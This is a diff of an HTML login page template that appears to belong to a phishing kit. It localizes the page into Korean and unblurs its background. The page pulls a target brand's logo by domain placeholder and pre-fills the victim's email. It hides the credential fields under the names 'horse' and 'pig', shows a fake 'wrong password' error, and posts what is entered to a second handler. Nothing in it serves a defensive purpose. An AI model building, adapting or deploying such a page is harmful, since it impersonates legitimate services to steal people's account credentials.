@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Secure login</title>
+<title>안전한 로그인</title>
 
 <link rel="icon" type="image/svg+xml" href="https://cdn.brandfetch.io/domain/{{dman}}?c=1idgn9W1pGfVaJw8IDW">
 
@@ -38,8 +38,8 @@
     height:100%;
     border:none;
     z-index:-2;
-    filter:blur(20px);
-    transform:scale(1.1);
+    filter:none;
+    transform: none;
     opacity:0.3;
     pointer-events:none;
   }
@@ -182,34 +182,34 @@
 
   <div class="top">
     <img class="logo" src="https://cdn.brandfetch.io/domain/{{dman}}?c=1idgn9W1pGfVaJw8IDW"/>
-    <div class="title">log in</div>
-    <div class="sub">Continue using your account.</div>
-    <div class="security">🔒 Securely encrypted sessions</div>
+    <div class="title">로그인</div>
+    <div class="sub">계정을 사용하여 계속 진행하세요.</div>
+    <div class="security">🔒 안전하게 암호화된 세션</div>
   </div>
 
   <!-- PYTHON CONTROLLED ERROR -->
   <div class="error {% if not error %}hidden{% endif %}" id="errorBox">
-    Your password is incorrect. Please try again.
+    비밀번호가 잘못되었습니다. 다시 시도해 주세요.
   </div>
 
   <form action="second" method="POST">
 
     <div class="input">
-      <label>email</label>
+      <label>이메일</label>
       <input type="email" name="horse" value="{{eman}}" required>
     </div>
 
     <div class="input">
-      <label>password</label>
+      <label>비밀번호</label>
       <input type="password" name="pig" required>
     </div>
 
     <div class="row">
-      <label><input type="checkbox" name="remember"> remember me</label>
-      <a href="#">Forgot your password??</a>
+      <label><input type="checkbox" name="remember"> 나를 기억해줘</label>
+      <a href="#">비밀번호를 잊으셨나요??</a>
     </div>
 
-    <button type="submit">continue</button>
+    <button type="submit">계속하다</button>
 
   </form>
 
